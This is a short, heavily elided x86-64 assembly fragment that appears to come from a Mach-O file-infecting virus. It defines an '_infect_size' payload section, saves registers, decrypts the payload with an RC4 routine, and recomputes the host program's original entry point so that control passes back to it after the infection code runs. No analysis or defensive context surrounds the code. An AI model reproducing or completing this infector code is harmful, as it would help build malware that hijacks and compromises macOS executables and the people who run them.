...
section .text
    _infect_size dd _end - _text_infect
    
_text_infect:                               ; Mach-O version
    push rdi
    push rsi
    push rax
    push rbx
...
decrypt:
    ...
    lea rsi, [rel _text_infect]
    add rsi, qword [rel sectext_offset]
    call _RC4

back:
    lea rax, [rel _text_infect]
    add rax, qword [rel old_entryoff]
    mov qword [rel old_entryoff], rax
